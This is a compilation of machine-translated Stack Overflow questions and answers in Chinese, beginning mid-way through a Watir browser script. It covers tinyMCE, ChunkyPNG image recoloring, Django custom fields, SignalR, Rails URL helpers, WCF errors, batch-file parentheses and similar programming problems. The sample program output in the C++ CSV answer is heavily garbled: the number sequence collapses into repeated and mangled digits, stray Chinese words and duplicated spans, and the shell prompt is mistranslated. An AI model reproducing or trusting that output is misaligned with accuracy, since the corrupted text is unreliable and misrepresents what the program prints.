b.a(:title => 'Bold (Ctrl+B)').hover
b.a(:title => 'Bold (Ctrl+B)').click

b.a(:title => 'Italic (Ctrl+I)').hover
b.a(:title => 'Italic (Ctrl+I)').click

b.a(:title => 'Underline (Ctrl+U)').hover
b.a(:title => 'Underline (Ctrl+U)').click

b.a(:title => 'Strikethrough').hover
b.a(:title => 'Strikethrough').click

b.a(:title => 'Align Left').hover
b.a(:title => 'Align Left').click

b.a(:title => 'Align Center').hover
b.a(:title => 'Align Center').click

b.a(:title => 'Align Right').hover
b.a(:title => 'Align Right').click

b.a(:title => 'Align Full').hover
b.a(:title => 'Align Full').click

b.table(:id => 'content_styleselect').hover
b.table(:id => 'content_styleselect').click
b.a(:text => 'example2').hover
b.a(:text => 'example2').click

b.table(:id => 'content_styleselect').hover
b.table(:id => 'content_styleselect').click
b.a(:text => 'example1').hover
b.a(:text => 'example1').click

b.table(:id => 'content_styleselect').hover
b.table(:id => 'content_styleselect').click
b.a(:text => 'tablerow1').hover
b.a(:text => 'tablerow1').click 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-24T20:44:18.677

在 c# 中将内容输入到 tinyMCE 中使用：

```
yourWebDriver.ExecuteScript(string.Format("tinyMCE.getInstanceById('{0}').setContent('{1}');",yourWebElement.GetAttribute("id"), "hello world")); 
```

# ruby - 如何修改图像的颜色以消除活力？

> ID：13957918
> 
> 赞同：8
> 
> 时间：2012-12-19T17:32:23.660
> 
> 标签：ruby, image-processing, colors, imagemagick, chunkypng

我如何改变颜色：

[![在此处输入图像描述](../Images/3c1a7efe187ec3b59d97350059fe761c.png)](https://i.stack.imgur.com/KxOq6.png)

进入这个：

[![在此处输入图像描述](../Images/351eff6082a14594b2fdb49819a2c9fc.png)](https://i.stack.imgur.com/0eUul.png)

我使用 Gimp 生成输出图像，输入图像作为第一层，图像的背景颜色作为第二层，在“图层”面板中，我选择了“颜色”模式

我想保留背景颜色，但希望颜色是棕色的。

有什么想法可以用 ChunkyPNG 做到这一点吗？还是应该将 ImageMagick 与颜色查找表一起使用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T19:26:41.737

谢谢你的想法。

我发现 Linuxios 中最有用的[Gimp 层模式](http://docs.gimp.org/en/gimp-concepts-layer-modes.html)

```
require "json"
require "httpclient"
require "chunky_png"

module ChunkyPNG::Color

  def h(value)
    r,g,b = r(value).to_f / MAX, g(value).to_f / MAX, b(value).to_f / MAX
    min, max = [r,g,b].minmax

    return 0 if max == min

    result = case max
      when r then (g - b) / (max - min) + (g < b ? 6 : 0)
      when g then (b - r) / (max - min) + 2
      when b then (r - g) / (max - min) + 4
    end

    result * 60
  end

  def s(value)
    min, max = [r(value), g(value), b(value)].minmax.map { |value| value.to_f / MAX }
    max == 0 ? 0 : (max - min) / max
  end

  def v(value)
    [r(value), g(value), b(value)].max.to_f / MAX
  end

  def hsv(h, s, v)
    h = h.to_f / 360
    i = (h * 6).floor
    f = h * 6 - i
    p = v * (1 - s)
    q = v * (1 - f * s)
    t = v * (1 - (1 - f) * s)

     case i % 6
      when 0 then r, g, b = v, t, p
      when 1 then r, g, b = q, v, p
      when 2 then r, g, b = p, v, t
      when 3 then r, g, b = p, q, v
      when 4 then r, g, b = t, p, v
      when 5 then r, g, b = v, p, q
    end

    rgb *[r,g,b].map {|value| (value * 255).round }
  end

end

module CoderWall

  module_function

  def badges(username)
    url = URI.escape("https://coderwall.com/#{username}.json")
    response = HTTPClient.get(url)

    json = JSON.parse(response.body)
    urls = json['badges'].map {|b| b['badge']}
    brown      = ChunkyPNG::Color.from_hex("#bf8a30")
    hue        = ChunkyPNG::Color.h(brown)
    saturation = ChunkyPNG::Color.s(brown)
    value      = ChunkyPNG::Color.v(brown)
    urls.each do |url|
      matches = url.match /(\w+)\-/
      response = HTTPClient.get(url)
      filename = "./tmp/coderwall/"+matches[1]+".png"
      File.open(filename,"w") {|f| f.write(response.body)}

      image = ChunkyPNG::Image.from_file(filename)

      image.pixels.map! do |pixel|
          v = ChunkyPNG::Color.v(pixel)
          unless ChunkyPNG::Color.a(pixel) > 0
            v = value
          end
          ChunkyPNG::Color.hsv(hue,saturation, v)
      end
      image.save(filename.gsub(/\.png/,"_brown.png"), :fast_rgba)
    end
  end
end

badges = CoderWall.badges("astropanic") 
```

上面的代码由网络上的一些片段组成。

结果如下：[停止做新年决议。立即做出改变！](http://bashman.org/posts/stop-doing-new-year-resolutions-make-the-change-now)

# django - 在 Django 中，创建一个自定义 model.Field，它像 CharField 一样存储数据，但在管理员中的行为类似于 forms.DateField

> ID：13957919
> 
> 赞同：0
> 
> 时间：2012-12-19T17:32:24.917
> 
> 标签：django, django-forms, django-admin

我正在尝试创建一个`model.Field`名为 WeekField 的自定义。数据库字段必须以 8 个字符的字符串形式存储在`YYYYmmdd`. 我已经扩展`models.CharField`了：

```
class WeekField(models.CharField):
    def __init__(self, *args, **kwargs):
        super(WeekField, self).__init__(max_length=8, *args, **kwargs)

    def to_python(self, value):
        return Week(value)

    def get_prep_value(self, value):
        return value.get_id() 
```

上面引用的`Week`对象有一个构造函数，它可以采用格式中的日期或字符串`YYYYmmdd`。

我的问题是，在管理员中，它显示为一个文本字段。如何强制管理员将其视为日期字段？

我尝试将此添加到我的 WeekField 课程中，但无济于事：

```
def formfield(self, **kwargs):
        defaults = {'form_class': forms.DateField}
        defaults.update(kwargs)
        return super(models.CharField, self).formfield(**defaults) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T18:30:04.667

如果您改为子类 DateField 并提供一个 get_prep_value/to_python 将其转换为您想要存储在数据库中的文本格式怎么办？

[https://docs.djangoproject.com/en/dev/howto/custom-model-fields/#django.db.models.Field.get_db_prep_value](https://docs.djangoproject.com/en/dev/howto/custom-model-fields/#django.db.models.Field.get_db_prep_value)

# asp.net - SignalR 回退到端口 80 上的长轮询

> ID：13957921
> 
> 赞同：3
> 
> 时间：2012-12-19T17:32:32.913
> 
> 标签：asp.net, .net-4.0, signalr, signalr-hub

有谁知道为什么在部署服务器（Windows 2008 R2 64bit，IIS7.5）SignalR（1.0.0.0 rc1）上会退回到端口 80 上的长轮询，但如果站点配置在不同的端口上则使用 SSE？

我不接触软件——只需将站点的绑定更改为端口 8081 并查看客户端日志。

端口 80：

```
 [19:28:15 GMT+0200 (FLE Standard Time)] SignalR: Negotiating with '/signalr/negotiate'. jquery.signalR-1.0.0-rc1.min.js:10
[19:28:15 GMT+0200 (FLE Standard Time)] SignalR: Attempting to connect to SSE endpoint 'http://192.168.10.91/signalr/connect?transport=serverSentEvents&connectionId=0e082fb2-d94d-4907-9579-b4ccde10816d&connectionData=%5B%7B%22name%22%3A%22onair%22%7D%5D&tid=8' jquery.signalR-1.0.0-rc1.min.js:10
[19:28:18 GMT+0200 (FLE Standard Time)] SignalR: EventSource timed out trying to connect jquery.signalR-1.0.0-rc1.min.js:10
[19:28:18 GMT+0200 (FLE Standard Time)] SignalR: EventSource readyState: 0 jquery.signalR-1.0.0-rc1.min.js:10
[19:28:18 GMT+0200 (FLE Standard Time)] SignalR: EventSource calling close() jquery.signalR-1.0.0-rc1.min.js:10
[19:28:18 GMT+0200 (FLE Standard Time)] SignalR: This browser supports SSE, skipping Forever Frame. jquery.signalR-1.0.0-rc1.min.js:10
4
Object {Name: "WindowMain", Dock: 2, EleID: "mainContainer", Children: Array[5]}
 jquery.layoutengine.js:52
[19:28:18 GMT+0200 (FLE Standard Time)] SignalR: Attempting to connect to 'http://192.168.10.91/signalr/connect?transport=longPolling&connectionId=0e082fb2-d94d-4907-9579-b4ccde10816d&connectionData=%5B%7B%22name%22%3A%22onair%22%7D%5D&tid=8' using longPolling. 
```

端口 8081

```
[19:28:04 GMT+0200 (FLE Standard Time)] SignalR: Negotiating with '/signalr/negotiate'. jquery.signalR-1.0.0-alpha2.min.js:10
[19:28:04 GMT+0200 (FLE Standard Time)] SignalR: Attempting to connect to SSE endpoint 'http://192.168.10.91:8081/signalr/connect?transport=serverSentEvents&connectionId=08b410ad-7be1-4a94-be02-c713df035c98&connectionData=%5B%7B%22name%22%3A%22onair%22%7D%5D&tid=9' jquery.signalR-1.0.0-alpha2.min.js:10
[19:28:04 GMT+0200 (FLE Standard Time)] SignalR: EventSource connected jquery.signalR-1.0.0-alpha2.min.js:10
[19:28:04 GMT+0200 (FLE Standard Time)] SignalR: Now monitoring keep alive with a warning timeout of 40000 and a connection lost timeout of 60000 jquery.signalR-1.0.0-alpha2.min.js:10 
```

# c# - ListView DrawSubItem 事件

> ID：13957931
> 
> 赞同：0
> 
> 时间：2012-12-19T17:32:59.017
> 
> 标签：c#, winforms, listview

我的 Windows 窗体中有一个 ListView 控件。我正在使用 DrawSubItem 事件将图像添加到 ListView 子项。当我填充我的 ListView 时，这似乎很正常。但问题是每次我单击 ListView 时，都会触发 DrawSubItem 事件。因此，每次点击都会加载所有图像和文本，我无法在我的 ListView 上选择任何项目。我怎么解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-07T22:56:26.467

我设计了[Better ThumbnailBrowser](http://www.componentowl.com/better-thumbnail-browser)组件，为您解决图片的后台加载和线程同步，让您不必在绘图事件中设置图片。

您还可以尝试[Better ListView Express](http://www.componentowl.com/better-listview-express)，如果使用，它对任何类型都是免费的。

与常规的 .NET ListView 不同，您可以在项目中设置任意大小的图像。

# javascript - Ruby on Rails - json url 助手

> ID：13957935
> 
> 赞同：-1
> 
> 时间：2012-12-19T17:33:22.377
> 
> 标签：javascript, ruby-on-rails, ruby, json

我的代码是这样的：

```
$.getJSON("/somefolder/somefile.json?"+urlParams, function(json) {
    //populate combo here
}); 
```

我正在使用 sass 在 Rails 上工作，我拥有此代码的文件最初是 file.js，尽管为了使用管道资产，我已经将其更改为 file.js.erb

在开发中，我正在工作，`http://localhost:XXXX`所以结果还可以。在 Prod 中，我使用了一个文件夹`http://domain.com:XXXX/app`，所以结果很糟糕。

类似的编码`<%=image_tag("loading.gif", :class => "loading")%>`在此文件中可以完美运行，但`$.getJSON("<%= controller_method_path %>.json?"+urlParams`不能

有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:39:19.033

假设您的路由设置为在生产中使用前缀，则您应该对完整路径使用实际的路由方法。

```
$.getJSON("<%= thingies_url(@thingy, :json) %>?"+urlParams, ... 
```

现在应该在所有情况下正确生成整个路径。

* * *

但是像这样的疯狂是为什么通常不建议在域的子目录中运行 rails 应用程序的原因。它使路由和到其他页面和资产的相对链接更加令人头疼。

如果您可以在子域上托管 rails 应用程序。

```
# not awesome :(
http://mydomain.com/myapp

# totally awesome! :D
http://myapp.mydomain.com/ 
```

# asp.net - 从 wcf 服务调用类库时出错

> ID：13957936
> 
> 赞同：2
> 
> 时间：2012-12-19T17:33:23.763
> 
> 标签：asp.net, asp.net-mvc-3, wcf, class-library

我有一个 MVC 项目，我在其中使用 WCF 服务作为类库中方法的传递。我在服务中放置了一个查询，并从我的项目中调用了该服务，查询工作正常并返回了结果。我已将代码更改为直接指向类库，并且该方法运行良好并返回了我期望的结果。当我调用只调用类库并返回结果的 Web 服务时，它会中断。我在代码中得到的错误是：

> 接收对“url”的 HTTP 响应时出错。这可能是由于服务端点绑定未使用 HTTP 协议。这也可能是由于服务器中止了 HTTP 请求上下文（可能是由于服务关闭）。有关更多详细信息，请参阅服务器日志。

在研究这个时，我发现有几个人说这是一个通用的“它坏了”错误并启用跟踪。当我打开跟踪时，我只看到一条错误消息：

> 内容类型应用程序/soap+xml；charset=utf-8 被发送到需要 text/xml 的服务；字符集=utf-8。客户端和服务绑定可能不匹配。

我没有在我的 .config 文件中定义任何绑定。我有这个设置工作，但对类库进行了更改以使其更加面向对象。我已经解决了由该更改引起的所有错误，但我无法弄清楚这个错误。我已经尝试了通过谷歌搜索此错误找到的几个修复程序，但没有一个成功。有人对我还可以尝试什么有任何建议吗？

编辑：

查看我的项目的配置，在我设置 Web 服务引用时设置了绑定。它使用基本的http绑定。我现在猜想我可以单独与该部分交谈，因为第一个绑定已定义，第二个绑定是自动检测。我在想我的问题是当 2 个自动检测部件相互交谈时。试图沿着那个角度想出一些东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-14T17:16:42.660

我的经理是改变我的班级图书馆的人。她将我在对象上的所有身份都更改为对象。因此，预订而不是事件 ID 有一个事件对象。在这样做的过程中，她创建了一系列循环，其中一个事件有一个房间对象，房间对象有一个事件对象。或者一个人有一个地址对象，它有一个人对象。因此，我遇到的错误实际上是通用的“它破坏了”消息。

# c++ - 在 Linux 上的 C++ 中的一行上打印 5000 个浮点数时换行

> ID：13957937
> 
> 赞同：0
> 
> 时间：2012-12-19T17:33:27.737
> 
> 标签：c++, linux, fstream, truncate, ofstream

我正在通过 Linux 上的 C++ 将一长串浮点数打印到 .csv 文件中。

我需要在一行上打印 5000 个数字而没有任何中断。每个数字用逗号分隔。

但是，在打印出 512 个数字后，该行被中断，以“^M”结尾，然后转到换行符。但是，我从未在代码中添加换行符。

我的代码是：

```
 ofstream("MyFile.CSV") 
```

我也试过：

```
 ofstream("MyFile.CSV", std::ios_base::app) 
```

它们都不起作用。我在 EXCEL 和 VIM 中打开它。

搜索后，我找不到有用的解决方案。

任何帮助将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-19T17:58:10.613

从下面的程序开始，看看行为是否不同。还可以考虑使用“wc”之类的工具来获得真正的行数，而不是相信编辑器的行为。我对 C++ 的了解远远落后于时代，但我相信那些新奇的字符串会和我心爱的人一样好用`char *`。

```
#include <fstream>

using namespace std;

int main() {
        ofstream out("stackoverflow-13957937.csv");

        const char *separator = "";
        const char *comma = ",";

        for(int i=0; i<1000; i++) {
                out << separator;
                out << i*1.1f;
                separator = comma;
        }
        out << endl;
        return 0;
} 
```

这个程序将输出 1000 个浮点数，用逗号分隔，到一行。

```
chet@baconator:~$ g++ -Wall stackoverflow-13957937.cc -o stackoverflow-13957937
chet@baconator:~$ ./stackoverflow-13957937
chet@baconator:~$ cat stackoverflow-13957937.csv
    0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9,11,12.1,13.2,14.3,15.4,16.5,17.6,18.7,19​​.8,20.9,22,23.1,24.2,25.3,26.4, 27.5,28.6,29.7,30.8,31.9,33,34.1,35.2,36.3,37.4,38.5,39.6,40.7,41.8,42.9,44,45.1,46.2,47.3,48.4,49.5,50.6,51.7,52.8,53.9, 55,56.1,57.2,58.3,59.4,60.5,61.6,62.7,63.8,64.9,66,67.1,68.2,69.3,70.4,71.5,72.6,73.7,74.8,75.9,77,78.1,79.2,80.3,81.4, 82.5,83.6,84.7,85.8,86.9,88,89.1,90.2,91.3,92.4,93.5,94.6,95.7,96.8,97.9,99,100.1,101.2,102.3,103.4,104.5,105.6,106.7,107.8,106.7,107.8,10.1 112.2,113.3,114.4,115.5,116.6,117.7,118.8,119.9,121,122.1,123.2,124.3,125.4,126.5,127.6,128.7,129.8,130.9,132,133.1,134.2,135.3,136.4,137.5,138.6,139.7,140.8, 141.9,143,144.1,145.2,146.3,147.4,148.5,149.6,150.7,151.8,152.9,154,155.1,156.2,157.3,158.4,159.5,160.6,161.7,162.8,163.9,165,166.1,167.2,168.3,169.4,170.5,171.6, 172.7,173.8,174.9,176,177.1,178.2,179.3,180.4,181.5,182.6,183.7,184.8,185.9,187,187,188.1,189.2,190.3,191.4,192.5,192.5,193.6,194.7,19​​4.7,19​​5.8,95.8,196.96,198,198,198,199.199.199.199.200.2,20.20.220.20.2，20.20.20.20.20.2，20.20.20.20.20.2 in 212.3,213.4,214.5,215.6,216.7,217.8,8,218.9,9,2220,221.1,222.222.22.22，222,2233.3,3,3,3,225.5,5,5,5,5,226.6,2227.7,7,7,7,228.8,8,8,8,2228.8,22228.8,222229.9,2239.9,239.9,2332.233.9,233.9,232.232.22，223.9.9,232.232.232.22，223.9.9,232.232.233.9mt 242,243.1,244.2,245.3,246.4,247.5,248.6,249.7,250.8,251.9,253,254.1,255.2,256.3,257.4,258.5,259.6,260.7,261.8,262.9,264,265.1,266.2,267.3,268.4,269.5,270.6,271.7, 272.8,273.9,275,276.1,277.2,2,278.3,27999.4,280.5,281.5,281.6,282.6,282.7,283.83.8,84.9,284.9,286,287.1,288.2,289.39.39.39.39.399.399.399.399.399.3999.399.b 303.6,304.7,305.8,306.9,308,309.1,310.2,311.3,312.4,313.5,314.6,315.7,316.8,317.9,319,320.1,321.2,322.3,323.4,324.5,325.6,326.7,327.8,328.9,330,331.1,332.2,333.3, 334.4,335.5,336.6,337.7,338.8,339.9,341,342.1,343.2,344.3,345.4,346.5,347.6,348.7,349.8,350.9,352,353.1,354.2,355.3,356.4,357.5,358.6,359.7,360.8,361.9,363,364.1,365.2,366.3,367.4,368.5,369.6,370.7,371.8,372.9, 374,375.1,376.2,377.3,378.4,379.5,380.6,381.7,382.8,383.9,385,386.1,387.2,388.3,389.4,390.5,391.6,392.7,393.8,394.9,396,397.1,398.2,399.3,400.4,401.5,402.6,403.7, 404.8,405.9,407,408.1,409.2,410.3,411.4,412.5,413.6,414.7,415.8,416.9,418,419.1,420.2,421.3,422.4,423.5,424.6,425.7,426.8,427.9,429,430.1,431.2,432.3,433.4,434.5, 435.6,436.7,437.8,438.9,440,441.1,442.2,443.3,444.4,445.5,446.6,447.7,448.8,449.9,451,452.1,453.2,454.3,455.4,456.5,457.6,458.7,459.8,460.9,462,463.1,464.2,465.3, 466.4,467.5,468.6,469.7,470.8,471.9,473,474.1,475.2,476.3,477.4,478.5,479.6,480.7,481.8,482.9,484,485.1,486.2,487.3,488.4,489.5,490.6,491.7,492.8,493.9,495,496.1, 497.2,498.3,499.4,500.5,501.6,502.7,503.8,504.9,506,507.1,508.2,509.3,510.4,511.512.6,513.7,514.514.8,515.9,517,517,518.18.1,519.299.2,520.3,521.4,4,522.522.522.5223.6,522.524.7,525525525525525255255255555555555555555555559,59,59,59,59,59,59,55555559,59,55555555555555555太平值536.8,537.9,539,540.1,541.2,542.3,543.3,543.4,544.545.6,545.6,546.7,7,547,54.8,54.9,9,550,1,1,55555.5555.555555555555555555555555555555555555,5555555,555555555,55555555,55555555,555555555555555太平值567.6,568.7,569.8,570.9,572,573.1,574.2,575.3,576.4,577.5,578.6,579.7,580.8,581.9,583,584.1,585.2,586.3,587.4,588.5,589.6,590.7,591.8,592.9,594,595.1,596.2,597.3, 598.4,599.5,600.6,601.7,602.8,603.9,605,606.1,607.2,608.3,609.4,610.5,611.6,612.7,613.8,614.9,616,617.1,618.2,619.3,620.4,621.5,622.6,623.7,624.8,625.9,627,628.1, 629.2,630.3,631.4,632.5,633.6,634.7,635.8,636.9,638,639.1,640.2,641.3,642.4,643.5,644.6,645.7,646.8,647.9,649,650.1,651.2,652.3,653.4,654.5,655.6,656.7,657.8, 658.9,660,661.1,662.2,663.3,664.4,665.5,666.6,667.7,668.8,669.9,671,672.1,673.2,674.3,675.4,676.5,677.6,678.7,679.8,680.9,682,683.1,684.2,685.3,686.4,687.5,688.6,689.7,690.8,691.9,693,694.1,695.2,696.3,697.4,698.5,699.6, 700.7,701.8,702.9,704,705.1,706.2,707.3,708.4,709.5,710.5,710.6,711.6,711.712.8,712.8,715,715,715,716.1717,717,717.29.718.29.719.718.4.719.718.4.719.4\. ,719.4.719.718.4.19.4\. ,719.4.719.718.4.19.4\. ,719.4.719.4.719.4\. ,719.4.719.4.719.4\. ,719.4.719.4.718.4\. ,719.4.719.4.7199.419.419.4.198.4m 731.5,732.6,733.7,734.8,735.9,737,737,738.1,739.2,740.3,741.4,4,74,742.5,743.6,743.6,744.7445.8446.9446.7448,749749.749.749.74.74.279.74.251.279.175.2res 762.3,763.4,764.5,765.6,766.7,767.8,768.9,770,771.1,772.2,773.3,774.4,775.5,776.6,777.7,778.8,779.9,781,782.1,783.2,784.3,785.4,786.5,787.6,788.7,789.8,790.9, 792,793.1,794.2,795.3,796.4,797.5,798.6,799.7,800.8,801.9,803,804.1,805.2,806.3,807.4,808.5,809.6,810.7,811.8,812.9,814,815.1,816.2,817.3,818.4,819.5,820.6,821.7, 822.8,823.9,825,826.1,827.2,828.3,829.4,830.5,831.6,832.7,833.8,834.9,836,837.1,838.2,839.2,839.3,840.4,841.5,842 863.5,864.6,865.7,866.8,867.9,869,870.1,871.2,872.3,873.4,874.5,875.6,876.7,877.8,878.9,880,881.1,882.2,883.3,884.4,885.5,886.6,887.7,888.8,889.9,891,892.1,893.2, 894.3,895.4,896.5,897.6,898.7,899.8,900.9,902,903.1,904.2,905.3,906.4,907.5,908.6,909.7,910.8,911.9,913,914.1,915.2,916.3,917.4,918.5,919.6,920.7,921.8,922.9, 924,925.1,926.2,927.3,928.4,929.5,930.5,930.6,931.7,932.8,932.8,933.933.935,935,936.1,937.2,937.2,938.39393939.4,94,94,94,94,94,94,94,94.94994.994.994,94994.994.9994.994.994.9994.9994\. in 954.8,955.9,957,958.1,959.2,960.3,961.4,4,962.5,963.5,963.6,964.7,965.865.8,966.966.968,968,969.1,970.2,970.2,971.39797.97.997.997.99.99.99.99.99.999.99.999.999.99.999.998.，99.99.99.99.99.99.99.99.99.99.999.9999.9999.999.998\. ,999.99.99.99.99.99.999.999.99.99.99.9999.9999.9999.999.998.an in 985.6,986.7,987.8,988.9,990,991.1,992.2,993.3,994.4,995.5,996.6,997.7,7,998.8,99999.9,1001,1002.1002.1,1003.2,1004.3,1005.4,1005.4,1006.5,5,1007.6,1008.7,7,7,1009.8,9,8,9,10112,10112,101113.11011.101.101.101,101.101.2019.19.19.19.19.19.19.19.19.19.19.19.19.19.19.19.19.19.，101,101.19.19.19.19.19.19.19.bh 1023,1024.1,1025.2,1026.3,1027.4,1028.5,1029.6,1030.7,1031.8,1032.9,1034,1035.1,1036.2,1037.3,1038.4,1039.5,1040.6,1041.7,1042.8,1043.9,1045,1046.1,1047.2,1048.3,1049.4, 1050.5,1051.6,1052.7,1053.8,1054.9,1056,1057.1,1058.2,1059.3,1060.4,1061.5,1062.6,1063.7,1064.8,1065.9,1067,1068.1,1069.2,1070.3,1071.4,1072.5,1073.6,1074.7,1075.8,1076.9, 1078,1079.1,1080.2,1081.3,1082.4,1083.5,1084.6,1085.7,1086.8,1087.9,1089,1090.1,1091.2,1092.3,1093.4,1094.5,1095.6,1096.7.8,10971031.8,1032.9,1034,1035.1,1036.2,1037.3,1038.4,1039.5,1040.6,1041.7,1042.8,1043.9,1045,1046.1,1047.2,1048.3,1049.4,1050.5,1051.6,1052.7,1053.8,1054.9,1056,1057.1,1058.2, 1059.3,1060.4,1061.5,1062.6,1063.7,1064.8,1065.9,1067,1068.1,1069.2,1070.3,1071.4,1072.5,1073.6,1074.7,1075.8,1076.9,1078,1079.1,1080.2,1081.3,1082.4,1083.5,1084.6,1085.7, 1086.8,1087.9,1089,1090.1,1091.2,1092.3,1093.4,1094.5,1095.6,1096.7,1097.8,1098.91031.8,1032.9,1034,1035.1,1036.2,1037.3,1038.4,1039.5,1040.6,1041.7,1042.8,1043.9,1045,1046.1,1047.2,1048.3,1049.4,1050.5,1051.6,1052.7,1053.8,1054.9,1056,1057.1,1058.2, 1059.3,1060.4,1061.5,1062.6,1063.7,1064.8,1065.9,1067,1068.1,1069.2,1070.3,1071.4,1072.5,1073.6,1074.7,1075.8,1076.9,1078,1079.1,1080.2,1081.3,1082.4,1083.5,1084.6,1085.7, 1086.8,1087.9,1089,1090.1,1091.2,1092.3,1093.4,1094.5,1095.6,1096.7,1097.8,1098.9
chet@baconator:~$ wc stackoverflow-13957937.csv
   1 1 5790 stackoverflow-13957937.csv
切特@培根：~$

```

请注意，`wc`输出是行数 (1)、字数 (1) 和字节数 (5790)。

从技术上讲，行数包括换行符，因此如果最后一行没有以换行符结尾，那么它将报告的行数比真实行数少一。

但是，如果文件没有以换行符结尾，那么后面的提示`cat stackoverflow-13957937.csv`将在同一行。如下图所示：

```
chet@baconator:~$ echo -n '例子--> '
示例--> chet@baconator:~$

```

# batch-file - 如果变量中有空格，则带括号的“if”不起作用

> ID：13957940
> 
> 赞同：3
> 
> 时间：2012-12-19T17:33:36.020
> 
> 标签：batch-file, cmd

为什么以下命令可以正常工作：

```
set PATH=C:\Program Files (x86)\Path\With whitespaces\
if defined APP_HOME set PATH=.;%PATH% 
```

但是如果我使用带括号的“if”，则会出现错误“\Path\With 此时是意外的”

```
set PATH=C:\Program Files (x86)\Path\With whitespaces\
if defined APP_HOME ( 
   set PATH=.;%PATH%
) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-19T18:09:11.630

这个`)`角色有时很特别，有时没有。

如果有一个 active `(`，那么下一个未引用、未转义`)`的将关闭该块。

如果没有 active `(`，则在命令参数中未加引号、未转义`)`将被简单地视为文字。

您的 PATH 变量包含`)`过早关闭 IF 块的内容。在您的情况下，可以通过在作业周围添加引号来修复它。

```
set PATH=C:\Program Files (x86)\Path\With whitespaces\
if defined APP_HOME ( 
   set "PATH=.;%PATH%"
) 
```

不过要小心。有时 PATH 包含已引用的路径。如果 PATH 中已经有引号，则将赋值用引号括起来可能会破坏赋值。

这是一种在 PATH 前面添加值的万无一失的方法，无论当前定义是什么。该代码假定延迟扩展最初是禁用的。

```
set PATH=C:\Program Files (x86)\Path\With whitespaces\
if defined temp (
  setlocal enableDelayedExpansion
  for /f "eol=: delims=" %%P in ("!path!") do endlocal & set "PATH=.;%%P"
) 
```

# java - 通过 HTTP POST 处理大量数据的有效方法是什么？

> ID：13957941
> 
> 赞同：0
> 
> 时间：2012-12-19T17:33:52.683
> 
> 标签：java, performance, node.js, concurrency, nonblocking

我正在编写一个用于绘制和分析大量日志数据的应用程序。基本上，我们的应用程序（Web、Tomcat、控制台等）将具有自定义`log4j`附加程序，将日志条目发送到我们的远程服务器。

现在我想通过普通的 HTTP POST 接受这些日志条目。此时，Web 服务会将条目记录到数据库中。

我在 和 之间的栅栏`Node.js`上`Akka`。主要是因为我在 Java 和 JavaScript 方面都有经验。但是我是 Akka 的演员模式的新手，我读过 Node 不是真正并行的，除非你运行多个 Node 服务器？

我的逻辑是这样的：

1) 应用程序 POST 日志条目到服务器

2）服务器接受 HTTP 请求并创建一个 Amazon SQS 条目（或 Azure 服务总线..尚未决定）

3）工人清理队列并将条目存储在数据库中。

我认为这将允许非常快速的输入，但调用 SQS 操作将是一个漫长的 IO 过程。

我的另一个想法是接受 POST 请求，将其存储在 memcached 或 Redis 中，然后让工作人员从缓存中提取，发送到 SQS，然后清理数据库插入队列。这将具有 HTTP 请求尽可能快地传递数据并让其他工作人员处理记录的优势。

这显然听起来像是 Akka 的工作，因为我不能为每个请求分配一个 Actor，然后让它产生其他 Actor 来处理将其移入/移出缓存吗？

在测试阶段，我可以很容易地看到一次有 20 到 500 个请求。取决于我们在测试中打开了多少应用程序。但是一旦完全运行，我可以看到每秒有数千个请求来自我们拥有的所有应用程序。

所以我的问题是如何最好地处理我将获得的大量数据。我关心线程锁定、http阻塞等。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T23:40:23.460

在架构上，将入站日志数据卸载到队列以进行下游处理（过滤、分析、推送到数据库等）是正确的方法。如果您关心容量和扩展，那么您将需要在入站端使用更轻量级的基于 TCP 的协议。HTTP 虽然方便，但对于直接数据传输来说过于笨拙了。（至少，处理入站数据的服务器端组件应该直接从套接字连接读取，这在处理 HTTP POST 时通常不会发生。）

# python - Python - PySide 和 Qt 库之间的链接类型？

> ID：13957946
> 
> 赞同：3
> 
> 时间：2012-12-19T17:34:22.403
> 
> 标签：python, qt, pyside, static-linking, dynamic-linking

在 Python 和 C/C++ 组合的情况下，我想了解库的静态和动态链接。

Python Interpreter、PySide Qt Bindings 和 Qt 本身之间有什么类型的链接？

它是如何工作的？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-28T22:23:29.063

首先，从 C++ 到 python 的转换是由[SIP](http://pyqt.sourceforge.net/Docs/sip4/)完成的。查看示例代码，尤其是[这个](http://pyqt.sourceforge.net/Docs/sip4/using.html#a-simple-c-example)。

对于每个 Qt 类，都有一个对应的 SIP 规范文件。

# javascript - 禁用 jquery asp 面板

> ID：13957947
> 
> 赞同：2
> 
> 时间：2012-12-19T17:34:30.547
> 
> 标签：javascript, jquery, asp.net, jquery-ui

我正在创建 asp.net 以在 asp.net 面板中启用/禁用子表单元素，此脚本将启用编辑表单，但在我第二次单击后不会禁用它有人可以帮助我吗？

```
 <script type="text/javascript">
    $(function () {
        //createing toggle
        $("#check").button();

        $("[id$='check']").data('isenabled', true); //enabled assumption
        //disabled all input form 
        $("[id$=p_taskInfo]").children().prop("disabled", "disabled");
        $("input[name='check']").click(function () {
            var curruntState = $(this).data('isenabled');
            if (curruntState) {
                $("[id$=p_taskInfo]").children().removeProp("disabled");

            }
            else {
                $("[id$=p_taskInfo]").children().prop("disabled", "disabled");
            }
            $(this).data('isenabled', !currentState);
        }); //EOF click function 
    });//EOF function 
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-19T17:50:01.077

您的单词有错误`currentState`，您已在其他地方写过`curruntState`。

这是您的代码中使用正确关键字的示例，它工作正常，（在 Google chrome 上打开控制台以查看结果）

[http://jsfiddle.net/zHmh9/4/](http://jsfiddle.net/zHmh9/4/)

# objective-c - NSColor 有时会变异为 NSColorWell

> ID：13957948
> 
> 赞同：0
> 
> 时间：2012-12-19T17:34:41.293
> 
> 标签：objective-c, cocoa, nscolor

我有一个处理很多默认值的类，这是我初始化默认值的方式：

```
+ (void) initialize
{
    NSUserDefaults* defaults=[NSUserDefaults standardUserDefaults];
    NSData* colorData= [NSKeyedArchiver archivedDataWithRootObject: [NSColor orangeColor]];
